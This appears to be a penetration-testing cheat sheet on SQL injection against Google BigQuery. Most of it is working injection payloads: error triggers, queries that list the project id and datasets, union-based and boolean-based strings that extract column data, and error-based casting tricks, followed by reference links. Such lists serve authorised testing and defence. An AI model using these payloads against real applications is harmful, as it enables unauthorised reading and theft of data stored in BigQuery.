# Google BigQuery SQL Injection

> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities.

## Summary

* [Detection](#detection)
* [BigQuery Comment](#bigquery-comment)
* [BigQuery Union Based](#bigquery-union-based)
* [BigQuery Error Based](#bigquery-error-based)
* [BigQuery Boolean Based](#bigquery-boolean-based)
* [BigQuery Time Based](#bigquery-time-based)
* [References](#references)


## Detection

* Use a classic single quote to trigger an error: `'`
* Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```

| SQL Query                                             | Description |
| ----------------------------------------------------- | -------------------- |
| `SELECT @@project_id`                                 | Gathering project id |
| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |
| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |


## BigQuery Comment

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `#`                        | Hash comment                      |
| `/* PostgreSQL Comment */` | C-style comment                   |


## BigQuery Union Based

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## BigQuery Error Based

| SQL Query                                                | Description          |
| -------------------------------------------------------- | -------------------- |
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |
| `select CAST(@@project_id AS INT64)`                     | Casting              |


## BigQuery Boolean Based

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## BigQuery Time Based

* Time based functions does not exist in the BigQuery syntax.


## References

* [BigQuery SQL Injection Cheat Sheet - Ozgur Alp - February 14, 2022](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
* [BigQuery Documentation - Query Syntax - October 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
* [BigQuery Documentation - Functions and Operators - October 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* [Akamai Web Application Firewall Bypass Journey: Exploiting “Google BigQuery” SQL Injection Vulnerability - Duc Nguyen - March 31, 2020](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)